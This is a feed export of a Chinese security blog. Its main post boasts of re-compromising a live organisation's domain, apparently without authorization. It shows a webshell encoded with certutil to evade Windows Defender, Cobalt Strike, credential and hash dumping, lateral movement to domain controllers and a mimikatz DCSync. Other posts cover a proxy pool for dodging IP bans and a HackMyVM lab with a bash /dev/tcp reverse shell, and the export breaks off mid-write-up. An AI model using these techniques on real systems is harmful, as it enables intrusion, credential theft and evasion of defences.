9305c1eac83f40865ba2c3bab89ff06d2636598fe31e768930a601d11f95d1d9a5646e30c8e4b0216317f5fd44b2b7ad05b4316b57959bd8f90b110e9a95976ee0c44b35ca40ac5f30e27803f80376e040b7425464950ee70a96aa1c41290088f4bec8f6ac64623f6ac503ad9b3f6c2b1a46c4b7ada923133aca2717d25745d632f7d9785032be064cc149b125b49274ad90a0ddcd8333ba1e552b7201a44a277676b0819af6ca8848c879bedb9f11a12d3e55e7a3f902b774ead606aab9bb693674c0248b55e3d94363f6bf8a795f6176cb4a51e6c9424f197f8ee88bd45efe87549a2e95dd11ed1631af3edf811cd636ee7df4a4557956d91489d8743464682e88ccef9d55d37a435db52ed7901f2f41c3bdc0af79a5d88e68218781c57e6f64093df1f1b9a0aa5452409d87641fa4f17d4443fe487c8b40cf3d0c24f0148d7c76754f1aec6d48640867b7ab06bec4ddffb9fe797ad5385493a0ed7f28937a1cfd926ccc1e2e292524deeed7808127a8fdae88ab2855fbbfe1787db8d0da7b8211177bdd6ed84a3d9edf338418d80174334f37a0cb019fb40cba2e8711f309ae52109c5ff1084a17e90ffa7d317a2f1a381f66dc7d428ee4b2fdb74bf882fd9e24b42bd82901a827ec8a8bcab43f000448ca737fe05d4b92c6ea6e88341fc19bdadfe49f4516e2792478f9c34738587416a19b690038689c1fd46f5678da32703c27389a79c544ecd86bc651091314fe693c4ad62304b6431a5c9d9484b9a2c9eb0d28e24c95f356e7b0f08fab8cf220b66b028d2e132545979a0de9b79bb179acede4e01257be1351924957ad01271eab116a5b64f853295610bde8d8c618ee8eea3695a0e1084e5f6f1d392cc26cf2e918851e1f9de3f7421247772c56a88547d95e8eba4a5caba881c0e86c77c3a775730be6e728b4ab45ee0581700c5eecf820ebf718f7dfdc6979436438ba6b568f19c459633e423898a0f4070f7ecd439891b0d4cff8302cfd956dea3c7b65ea52503840ab9a1663890dc5f444329b753651c53ce1cf88f9aea91e04c21bfe847b24c59b47edb72f488508a0f1da493b29458584144af8645951a3053986c8b00a6b7667f9035504d5cffb7f1aa94454157982ee0e5f1699df6ba6c3a7637b55e2b1cd7c6a6f6fc884ad99ba43f7dc08e0916a1f8ff50b3a02c1ce3179e32a77c998b77fe9d145aeffc8ce025414c9d3e39a8ae2b54e2bcc3b79d86e7eafc3a71897b3645f4768e78af8423cbf9b3f72ef2a443aa9d3701243861a80c84773c24b78321c79bc37b807873c16630e26ddaf3389801f19aa3deb3f6e42eb94bcb82f6262c31458a17e6b858144eeeb385e59da15a4bd0cd3a62e9e6a72511be144c2efd6f69fdba39642123c0a16f392b61cda63245dda244e640cbe147d251209aaf37614f7e4f99748831d8fda87d9aea3f4aa023889f06693fd2f0e6fa96c6c11cd09cf7c2e51627d1298caef514c1dc4ca51fc6311b8d63578ae79864da0ddccdc7299f182d6992e03d61e0d27cc20b9ff011c054024db01c5150242a4dc95d31623cc157d1c3b5108ebd8a56ad9350fa7ff2c46fbe3125bec6456551064f5aae8aa692d1005d0053ef63e438a6147056688c16a60b401bd2b687dd1c645ff2bd93c67da2f02dd9d3b791897ab9c10a8a0955857d78059a2bef2858a603b7bd99bd1db3b9ebc4e8025055817f97086f2395b73dbcd5b96ca7a56140835c294195ab685bd22c36f9a8036e912d3acd866ed1aa5017ab2fa589643de2ec5dcea37c3b4f7134ee50a318bc9f064bda24142c2079c20de7eeb3a778f6bccc200da68d6d7de7766ab52c8e22237b06114cc5d51558eefa7db7146231850ee37e1cdd79ac6cd126741028ae651299a1dcf3af892ff925f4db5e648893f577623d56c387d682ea650b6471b27f4a539c36d3993ca6093ff224212ce85d1234cf3f12e909ee547cdee91a66223b7548d8e7fb8113917065215c82956073691736dac1a4dd2c9a41ff4373ea4128e4b43011a8a101d104b72b6b066f57c3f31740b6b02370471488c7a7815ec19e994eac2b2997260021244dc66e81ad4b5067694f996cf8e96ac37250cd83a96ac4ec127763540442758290bf61a44f352bd29bc5251e785e3a054d0416e52b969bcce40776022eb4f18121ccc80c00538c4fa3e8e3fcad2f253a133cb7e1f92af6c55af53a8a7b381c84f6abad8ad89b6ae09e7fac788c4f38da037dd0d9cdd93fe5807e82aa3c254591c4511208e4ce99dfa936849b7b0efaa444637efaa3e57ba2c30681b4f794ec0a21c8d649d9f65af87945f1f1da5eed8569e5033b6efb8e68ecd59eb23115a351a723d80bc16a7118a87dffe5fa0747535d3749936c7d3f53978bb4358055df43a91441e13499e6c93ef48797be7042979220e12afaa76eaffd39c9ad83ec5b8f6387dd2768b41c190c3efd7343d54cfed1cd60c4e313967455650fb2184c3d28fbd383e52522816b424080c00124c334370bf3696699f89203a62246a09d9368034c107b69fdf86e66c1097e2f8579b8c6e98f2a2204611eb040ae67dcedb83994af93acc6687626fd7257aaafd354cb86f8eded07bf9a6b7ecbb485938004022520bb779f727f7c01403916bfcbd450764c41cd2ec2347dbaa352dca51d7501764fb670a2150c1c33b074d413068d2c1ca759200cd52b0e14a27f2a7f517cb4ab43126eebee36bdcd5cf2e46eca4a10298ee1b7725d8f352061a32772d00631f0d4148e5e9b8362ea5ae3ddd40940888da70c2fd787c0bf8849966f40a508418ca69071c30dc414df34b4c6dccac9be75cf8e18b27b81c02ee34cbfc333706247edb8fe7a9832b419673838bcc07cfbe9ce720b0cb34d83cf1faec241ddfd588501dbddcd28544a340babeacfaa9d226e78cefe19714babfc54a6e721250df4d4762f22bd5e6e04730b853db56fabe8b6f74f2c511927732bde2cc9e3ff073e042ffc70b1c14dbd022c980c40075cf6f29eeebf6b13d5c60d37af8a069d2da6dbc0d9e0daa8119c924da6a754906b1a6de685ac440e0fb855500174069302bbb4c8a9c29101cf6d0e3a95cdb58d682c746f956d2ba820a6e486e6cc8210f2776041eaf2ad7d3576986107ef2bcd883d8bb54a25fe8a790c3a5807678e1eca8381faf8f3847fca913275cfddef6b7cc6e3e89e4799a03a154fbeb149e4e779050dc0971c4b6b97c518f4c614dfdf18738a9840f4e6dd04c83bc608b6c186afada26bf8987579fe56e8d7aa54a70cd7c0ddc384bce941e3ead023956ce42909a6feecec4cb414f010b075274e1510048fa56391693ca321a3722ecf23b34a9e82b61f77da1d1922e4350a5c537a394e15b519bf7949faafc68d4128482351ad1c46835b4a53ace249654e0fe722258726ebb5e67f217e9a86ebbce9d9483b62f5c69bfde8850f6fa7e5dfe9f7adca2f947ef6d51858fc64fb414a0e3612ec15433b1f1e3074d13f925ca538be39ba36b242c1d0257ad598401d8e662309a70cecc5f536ef58ca1318b1606e0a54f419d74417d155ad012f79a87974897387a49ddbdb1a078aeaeed99ee1cd24078a003cb555580ada5651a376b4ee2b0abf8c8304924f724c156075a11cc51e4e6cb131fae3fc5e974a36100ad006b7e34b50b3dc12e71c13494f9b3183300503c0f991439db1f31fe47422ddec20a7cf85eafdc099be50dd4245e33c3cd91a177b6be1028d2e8d7801c2e4750f075889e8a1dcf4a32adee46c30fd7c312832030a84ec27572b1dfeb3392f73b874c9e2ba67abb32f2c4aa093f27f3b6d972b9f446868cd83e4d43847f21ba27aa7422bf0a388754c9282bbb2da5a66f53729b3db12be53e2c43e46b7b0aa35f73b430dff37b4e8f571783c08538c0fe24a82e32ebddba7f0fb76e3c1cfba15df99a8013c466c03a8e4b7582ea9b91593c5193fb01a83e7b47c7b4d022d124d9eb8cac4872edd0c9de471d14bb1868d153421c70e8c554ec71c2fad31514bd560d6aeac8c236c99e0cfc8cd6846cc6c0da698c90947c42a4aa838e36398ff8c31881d46db572ee092f6751cf5cb46eb2ac7bcc2db27f45dd6c1bafdd66584c8d840ab4ece3b82e79a5e7a984723196aa75c688d9a16ce8de9729d69f7e56b901a3e2cb8278db4bd1d72bfb923fe26e3ff782e8893bd255938d318b7a99e7cea7572e61aa435057dbcd103b02dd679d07d93eb15a98e60b16e40ec2a224d13285f272d491e8502250825a3e29a3ca8f0552d1e746bfc916cb9905ee2d221e03ed9221eb42a6bb317cc6e5234c5848e93489d9cf620b7ced4252ab9d5a1a2ae57368fae5713890ebf807119225f13ecee001077237d1f2afa85d001103d5a9a7210fe081d92a2fb146b88606fc0bdcea8bc943225d84b1b5ff9df6f8f78c6aa7b61e6d35b6deaa3b44b11c46f0048e0c7ad5133778f067bf65a78a349b594724c7c28dcba0216929d8b0b7ea37386ceff49b8ef964ecf858e22429741ff5aa044d9e406171365b23834387d61837a06a5fdf7148dfb1e63d68b10eb6472f8fe892433897c06c1599893f1fde1a515ba3ded348c577d92bce4f46d5f34da4bb9f1b6749bc4a43c9c37aae230ec4caf8fa97fe220480cadf50b67f486a73097c06b993cb1f4b070fbe7fe7d5e22f072a75f1bf85e3d1d86c6d1938a0baa8e96b5cb89aa4c2c799a405735ede8ee7d8d1fd4cd8c02e4919b25733832547271d82a088a27392a5df57c7c5e2d9f468b0dabdba299ae2ba09093f29e5a4f4a62d0154bdf330a4ff7c386eb8d96a23f9407b3638187b7fe411662c8538a83b1d00d66f6c0a274c66a96af7e63350782c62d3c90878fbc49871422c1735ca11ac0399ac11d126e19f259aef1acb1a0f90982d7327bda97272a67f967966291586731e0dd68eac006234e17e5e78a5bd3e8e156eb70320b4cfcbafc222200868742ab0e580263ac56fff90dc6152829f7b6e2a06586b31523bcfb66aed196febd0426015f48db242105ce0c72228893b176e5191ac3537233b53a93d1ce20cc450c4974a1a808e0bcafd190bec9f3cfee456dca19808b904e238ed28b0823af12c61bb0a5637a11f186da7182686780014740264f8dfe7b1bb2f68f01b4b8b9be5752390b9d25f67c8dfd987cae3682dfcb4adc2c188ccc05cc33b2ea28975e8e89d02e80573ac20aba0ed2610ea127fcd0598e9ff189115dc5f74b8a73d200597018c66bf99c62ebe0d193ae525c039b650ce62c1084dc63e7084a8e67d2998891baa148a81d1e2928783d0a751d2e547cc0cf1a99dd9e002817651310dc18673dbb5fd1414de709c583f7b8ea1a66b91755311abeaf8030552afecce49e9afb66c0d42b8e1a45bf622faa0414a6834299359680539ecb60c94a1d1f24cfd8f0920c257e60f22fcbd4e3ead548f13f5eabc2876159d0ad8b7c4e9577eb74b21029a1ba6177ef52937f9e88c8a1c443d1975b7a55acdbe20d3096587d6211f0f3c629469babdc2bfe3dd1f7fa4b6aeefc29aa096b0e85b261fc6ea0ed30136b80f02ca14cb0bf6b35e140a4704cc96bff84aa356c8c2ed9eee7c2b0acb9205b7d966b204f4f1ec6665cca30c520700193c383bd1adb31e3f800a17946223e51fb3077a885ebc3f8a2da101fd9d19829fbe439ba274db67980182fac674706fd843f87568e4d1a8028a020d98f870a18ae1d1adbb4d8b4629e5b53e17621423eeb8884eaf3c6a932e5636b74265932bcebb7de6cf0cd4572461d89f6ed80bd167a8dc30936f581cbec91da10c6ff582f0b425fb36ef1bb6e96f3ba72cd90c85460e2cb055e66af4d46d2b4aaa723b58b6a03f788ccdb19935360ca7204c0fb4ff2be0eab7f203bcc39b970000f1c7986f948a886b5fb40f8428258334afd438bed319307e5782039f655cfef4b7872c2791fb7b77ff58e3e2120ee8b611a05055f0e0e88726df6305f4c16a4e577514000e19c25d223b79e5a82d29a3709748068c885369ab513c10cfbe98c20b604059a3bc032e0fa38aeba810b78d5d09befc0aad010dd85547ddc0b149bbbdbeb137878df12b5b1431b21e8f976db1e72def321f1d97c6e9a423572a21b690a5c383b94580fd1f1e178ef65aa51ab8ef10092fe5fd947b56e5ff0c6d03dccc3dba48dd83ec3f24c9e562a4efcaad99dfb540e62274a1093bd0ed05536c46f31ba3770c136a708c26d3f13470af786c81051e711844e3f5d350de8458eec7739ec988b6be3dc580ff3030d61d8f75f3f2a59730c491480460f3c19df901f04451defe5c0d0d3d663243cbeb26b7d8f55530170f72c1a1e3c2af7c5e66486c8e98a1ee8c4db03c1037cd3612a9c227eb23edd838dc0e8ea4fa8d163641eaff1b994a0936d48fb643e7854af3b7b3ed9c1f0fb48e5f9718c7601dccd4abe2aaa6a7704efa16130c790e018c3abf4b02bb070a99fb87ba46c5944f9d348e1153c1c56584e05a59ede391c2730976ca1b91667e6a32723f5f92cb59af6ded2d300758910cf23444b95be5b8bf6256cf01f6474db8beba1288b63af4faa6dab4bf331f93baef5b46357a892c8c1af482e7d23537b083ac6fe4bf27172db1479c758b1589eedee311c10ca8e17a8e9bf1edbb0b1a6b027a912964203bed33fd571d88fc0ca919913493e003f56a8f9f608a2683e76090f2738108dad98a9c19a94c825dd2e27ac977bf070ae9ee8ebba649d8e9c956789f1bd880e3b2d956f59603ece472b9c348115d9e1367f15585ca7c50ccd84bcde4e4941fb56f88d169a72b7cbf4401bd86361841da41a700593d8ab6c1e9afa18650ef245e1083b4755ad96da11abf0fe84e3d4d5e69e50dbdf420ab7139d47837e55bf5d78e946ff708c9b59919c46f5f83d4052b44a7324e8c429c05ffca192b8b2a06bb10a33e38fdeb9c48edd95c80cb44a91ed7cc289ef53c351cfb6e30acf41d89e86c42cbf3fe10f5ba7cafd4b43f319b829f1d1115f07fe67f378228438e6aebe0a430b30f69e45d633dc6a3765c93ba77386c5b4760d3276bdde5e1bc37bbc67ba679f09833b41d85dbcbc741232c8e12d0c1449a671b9534f44f6ec11e63c80fa8c2a193f501a47ab1f36a04e8bb487a2cf83d2d0ffbedc847775f4e0fb7b5e7b0d1561e12c842a68e4e5e47f88629f30fca2da9154a835b5154b3ffac2886bf8baaefd604bbd5bd343a86ead32e1df92f7b18774157c9988715c9ff7b4c254ed7873c9c23a6ad1abb028e03f6f347afad14dfaac120a04dfecb5607ebb35fde974111cef58345bfc051484219b31f2dca4ce4e99bbb1904de803eb0e669ece1a44ae08350b339d58beb24c9dabb733cdddb065abde22d7d0f6a890b47994cd05ca69d819980471b47c85f2c77b5e4758fa232f65b9397b2c05962431b3db40a4c9cd213322351093507f1be9e9707dee88ee1c7635b4fda320eb642c0a43bd0643ac18328333fd2002d16527a932335bb08edbe52e92ae6678ee4d9f36436272218eea86cfc08e339e8b878b415ba17120fb460783826b625191812a578d2965f14d104943ec44b3b386545e1b7bc61064c53a418466d2e971ea8d015209968ff64a14d7682de4941d61ce7953b1215694db31503644a107b04c35ca76f94dbc3b87198eb30d38a29a802878729c6b9bfcbffe1bab77fd2b31dafc94ab0ca9f3bd02b4da304e73f49fb3336bad530077fd9fd96ce21bb79428ff5454c0a2f0a060f786fdd3250c44b266c18dceaed439f79b671e790c44ff48cc9e2e1897365b9e7563c538422162b1148e06c9c83e81aab03313942d4ac987b41b6753de2279c370cf962cacc0c66178dbe9cd1061987125fa4ca427766e27bb7f50d763e8bdd97e38668a5f70084d8eba091fc89b3f516dab3e98ba83bc1504644baad14aeb01f329a842b3f43c17fad8aaee0c8880d805d86d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>梅开二度之旧站新开 - 从外网RCE到内网域控</title>
      <link href="/posts/1/"/>
      <url>/posts/1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个目标之前已经打穿了，当时已经拿到了域控权限，然后管理员把站关掉了，今天整理笔记，突然心血来潮，又去看了一下这个站，发现它又恢复了…..</p><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2F5b0988e595225.cdn.sohucs.com%2Fq_70%2Cc_zoom%2Cw_640%2Fimages%2F20181213%2F825c81a7bb384128be49e7e499b8e78d.jpeg&refer=http%3A%2F%2F5b0988e595225.cdn.sohucs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1650453712&t=f808303178f23ea1447055469344dce6"></p><p>复测发现该站加了杀软，不能直接上线cs了，不过这都是小问题，管理员以为有个杀软就能不被日了？太年轻了，掏出三板斧就是一顿干，当我日进内网那一刻，我发现它啥都没变，还是熟悉的味道，熟悉的配方……</p><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.julinghu.com%2F2021%2F09%2F20210922001853559.jpg&refer=http%3A%2F%2Fimg.julinghu.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1650454026&t=e24f47a699a7778246414180a317f0d3"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>通过jboss反序列化获得一个入口权限，上次打的时候还没有杀软的，这次竟然有杀软了，所以powershell不能直接上线，我是菜鸡又不会免杀呜呜呜呜，那就只能采用最朴素的方式。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:\ &amp;&amp; <span class="built_in">dir</span> /S  *.jsp &gt; res.txt <span class="comment">#用这个方法找网站根目录，防止输出数据过多，所以选择输出内容重定向到文件中</span></span><br></pre></td></tr></table></figure><p>别问我为啥不部署war包getshell，我第一次打的时候是可以部署的，后来管理员好像修复掉了（这个站下线过一段时间），我这次部署war包，发现部署不上去了，但是这个站还有反序列化漏洞可以利用。</p><p>朴素地得到网站根路径</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404134648845.png" alt="image-20220404134648845"></p><h2 id="Bypass-杀软"><a href="#Bypass-杀软" class="headerlink" title="Bypass 杀软"></a>Bypass 杀软</h2><p>windows defender</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404144526134.png" alt="image-20220404144526134"></p><p>使用windows自带工具certutil编码webshell之后再echo到网站根目录下解码即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="literal">--encode</span>  webshell.jsp webshell.txt <span class="comment">#编码webshell</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> “webshellxxxxxxxx” &gt; /path/shell.txt <span class="comment"># 内容过长的话，可以分次echo，使用&gt;&gt;追加</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="literal">--decode</span>  shell.txt shell.jsp <span class="comment">#解码webshell</span></span><br></pre></td></tr></table></figure><p>这种方式可以绕过一些垃圾的杀软，如果有大佬会powershell免杀，希望可以教教我，希望你不要不识好歹。</p><p><img src="https://img0.baidu.com/it/u=1612249915,2074564743&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=432"></p><p>冰蝎连接，上来就是system权限，省的提权了</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404140036343.png" alt="image-20220404140036343"></p><h2 id="Cobalt-Strike-上线"><a href="#Cobalt-Strike-上线" class="headerlink" title="Cobalt Strike 上线"></a>Cobalt Strike 上线</h2><p>随便免杀一下就上线了cs</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404140329481.png" alt="image-20220404140329481"></p><p>抓明文密码，抓到几个域用户以及本地管理员的hash</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404141109490.png" alt="image-20220404141109490"></p><p>Dump hash</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404141149119.png" alt="image-20220404141149119"></p><h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404141447856.png" alt="image-20220404141447856"></p><p>查询域管</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure><p>存在两个域管用户</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404141638083.png" alt="image-20220404141638083"></p><h3 id="定位DC"><a href="#定位DC" class="headerlink" title="定位DC"></a>定位DC</h3><p>查询主域控制器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure><p>两个域控制器</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404142032452.png" alt="image-20220404142032452"></p><p>查询主域控制器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404142056562.png" alt="image-20220404142056562"></p><p>查询DC主机名以及DC ip地址</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nslookup <span class="literal">-type</span>=SRV _ldap._tcp</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404142242001.png" alt="image-20220404142242001"></p><h3 id="内网存活主机扫描"><a href="#内网存活主机扫描" class="headerlink" title="内网存活主机扫描"></a>内网存活主机扫描</h3><p>机器还是非常多的</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404145725535.png" alt="image-20220404145725535"></p><p>我上传的东西都会被杀，这很windows defender，所以我打算…..</p><p><img src="https://img2.baidu.com/it/u=880027713,2533080897&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=441"></p><h3 id="本地管理员密码"><a href="#本地管理员密码" class="headerlink" title="本地管理员密码"></a>本地管理员密码</h3><p>我只能说这个密码很标准，不然我还能说什么，想必这个管理员一定有很多年的从业经验，所以他才能设置出这么复杂、这么有脑洞的密码</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404145918208.png" alt="image-20220404145918208"></p><p>我就socks代理直接上3389关闭杀软，我真的受不了了</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404150707864.png" alt="image-20220404150707864"></p><p>mlgb的太卡了,遂放弃….</p><h2 id="DC横向上线"><a href="#DC横向上线" class="headerlink" title="DC横向上线"></a>DC横向上线</h2><p>上次渗透测试记住了DC的域管hash，直接横向一波看看有无惊喜,结果一发入魂</p><p>192.168.0.254 DC1</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404161841193.png" alt="image-20220404161841193"></p><p>192.168.0.254 DC2</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404162614299.png" alt="image-20220404162614299"></p><h2 id="All-In"><a href="#All-In" class="headerlink" title="All In"></a>All In</h2><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404172901870.png" alt="image-20220404172901870"></p><h2 id="域内所有用户hash"><a href="#域内所有用户hash" class="headerlink" title="域内所有用户hash"></a>域内所有用户hash</h2><p>几百个用户吧，小环境</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  @lsadump::dcsync /domain:xxxxx.loxxx /all /csv</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404172215237.png" alt="image-20220404172215237"></p><p>域内计算机列表，大概百来台机器的样子，只拿下了几台服务器，根据命名规则推测数字结尾的机器应该是办公区的员工PC，大部分都是不存活状态，估计下班关机了</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404172601073.png" alt="image-20220404172601073"></p><p>内网比较小，一眼看到头的那种</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220404193814637.png" alt="image-20220404193814637"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我是菜狗。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>突破反爬虫机制之 - ip代理池搭建</title>
      <link href="/posts/336723263/"/>
      <url>/posts/336723263/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><blockquote><p>渗透本就是逆天而为。  — 不知道谁说的</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试过程中的一些高危测试行为会导致ip被安全设备封禁，比如扫描、sql inject等等、这个时候就需要一个代理ip池来规避这种问题，不会用不要紧，但是东西一定要有。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>作者项目地址：<a href="https://github.com/qiyeboy/IPProxyPool">qiyeboy&#x2F;IPProxyPool: IPProxyPool代理池项目，提供代理ip (github.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackmyvm - Serve WriteUp</title>
      <link href="/posts/88024327/"/>
      <url>/posts/88024327/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p><strong>Machines Name：</strong>Hackmyvm - Serve</p><p><strong>Difficulty：</strong>easy</p><p><img src="https://hackmyvm.eu/img/m/machine.gif"></p><p>nmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Hackmyvm Machines </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackmyvm - Preload WriteUp</title>
      <link href="/posts/2515702210/"/>
      <url>/posts/2515702210/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p><strong>Machines Name：</strong>Hackmyvm - Preload</p><p><strong>Difficulty：</strong>easy</p><p><img src="https://hackmyvm.eu/img/m/machine.gif"></p><p>nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sS -vv -Pn 192.168.56.14</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331145917236.png" alt="image-20220331145917236"></p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331145945651.png" alt="image-20220331145945651"></p><p>首页源代码href指向?multiply&#x3D;7*7，推测可能是服务器模版注入(SSTI)</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331150023250.png" alt="image-20220331150023250"></p><p>5000端口无响应</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331150254151.png" alt="image-20220331150254151"></p><p>50000端口网络错误</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331150316173.png" alt="image-20220331150316173"></p><h2 id="ffuf-GET参数"><a href="#ffuf-GET参数" class="headerlink" title="ffuf GET参数"></a>ffuf GET参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -ic -c -w ./test.txt -u <span class="string">&#x27;http://192.168.56.14:50000/?FUZZ=1&#x27;</span> -mc 200</span><br></pre></td></tr></table></figure><p>得到get参数为cmd，这里使用大字典fuzz会导致50000端口的服务崩溃掉，所以意思一下吧</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331155723392.png" alt="image-20220331155723392"></p><p>SSTI 服务器模版注入</p><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331155916749.png" alt="image-20220331155916749"></p><h2 id="SSTI-Getshell"><a href="#SSTI-Getshell" class="headerlink" title="SSTI Getshell"></a>SSTI Getshell</h2><p>使用工具直接打</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tplmap.py -u <span class="string">&#x27;http://192.168.56.14:50000/?cmd=1*&#x27;</span> --os-shell</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331151558666.png" alt="image-20220331151558666"></p><h2 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a>Reverse shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.56.8/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331151648018.png" alt="image-20220331151648018"></p><h2 id="user-txt"><a href="#user-txt" class="headerlink" 